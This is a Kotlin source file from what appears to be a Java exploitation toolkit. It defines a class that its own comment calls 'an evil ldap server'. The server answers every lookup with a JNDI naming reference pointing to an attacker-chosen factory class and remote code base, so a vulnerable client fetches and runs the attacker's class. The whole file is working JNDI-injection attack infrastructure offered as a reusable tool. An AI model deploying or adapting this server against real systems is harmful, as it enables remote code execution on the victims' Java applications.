package top.ceclin.jser.tool.ldap

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchRequest
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor
import com.unboundid.ldap.sdk.Entry

/**
 * An evil ldap server that returns a reference with [factory] and [codeBase] for any client lookup operation.
 * As a result, victim will load [factory] class on [codeBase].
 *
 * @param addition additional operation on [Entry]
 */
class LdapRemote(
    private val factory: String,
    private val className: String = "java.lang.Object",
    private val codeBase: String? = null,
    port: Int = 1389,
    private val addition: (Entry.() -> Unit)? = null,
) {
    private val directoryServer = LdapCommon.createDirectoryServer(port) {
        addInMemoryOperationInterceptor(object : InMemoryOperationInterceptor() {
            override fun processSearchRequest(request: InMemoryInterceptedSearchRequest) {
                request.setRequest(LdapCommon.voidSearchRequest)
            }

            override fun processSearchResult(result: InMemoryInterceptedSearchResult) {
                val entry = Entry(result.request.baseDN).apply {
                    addAttribute("objectClass", "javaNamingReference")
                    addAttribute("javaClassName", className)
                    addAttribute("javaFactory", factory)
                    codeBase?.let { addAttribute("javaCodeBase", it) }
                    addition?.let { it() }
                }
                result.sendSearchEntry(entry)
            }
        })
    }

    fun start() {
        directoryServer.startListening()
    }

    fun stop() {
        directoryServer.shutDown(true)
    }
}